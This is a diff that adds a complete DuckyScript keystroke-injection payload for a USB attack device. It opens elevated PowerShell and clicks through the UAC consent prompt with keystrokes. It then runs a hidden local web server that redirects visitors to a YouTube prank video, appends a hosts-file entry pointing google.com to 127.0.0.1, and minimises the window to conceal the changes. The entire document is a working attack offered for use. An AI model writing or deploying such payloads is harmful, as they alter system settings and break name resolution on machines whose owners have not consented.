@@ -1,0 +1,21 @@
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+GUI TAB
+GUI TAB
+ENTER
+DELAY 2000
+
+STRING Start-Job { $l=New-Object Net.HttpListener; $l.Prefixes.Add('http://localhost:8080/'); $l.Start(); while($l.IsListening){ $c=$l.GetContext(); $r=$c.Response; $r.StatusCode=302; $r.RedirectLocation='https://www.youtube.com/watch?v=dQw4w9WgXcQ'; $r.Close() } }
+ENTER
+DELAY 1000
+
+STRING Add-Content "$env:SystemRoot\System32\drivers\etc\hosts" "`n127.0.0.1 google.com"
+ENTER
+DELAY 500
+
+ALT SPACE
+STRING n
+
